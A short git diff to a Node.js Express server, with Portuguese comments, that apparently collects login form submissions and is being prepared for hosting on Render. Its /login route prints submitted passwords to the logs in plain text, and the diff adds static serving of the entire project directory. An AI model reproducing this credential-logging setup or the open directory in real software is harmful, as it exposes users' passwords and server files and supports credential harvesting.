@@ -2,6 +2,8 @@ const express = require('express');
 const path = require('path');
 const app = express();
 
+// Permite que o servidor carregue as imagens publicamente
+app.use(express.static(__dirname)); 
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/', (req, res) => {
@@ -17,9 +19,9 @@ app.post('/login', (req, res) => {
     console.log(`Senha: ${senha}`);
     console.log('=================================\n');
 
-    res.send('Dados enviados com sucesso! Confira o terminal do VS Code.');
+    res.send('Dados enviados com sucesso! Confira o painel de Logs no Render.');
 });
 
 app.listen(3000, () => {
-    console.log('Servidor rodando! Acesse: http://localhost:3000');
+    console.log('Servidor rodando!');
 });
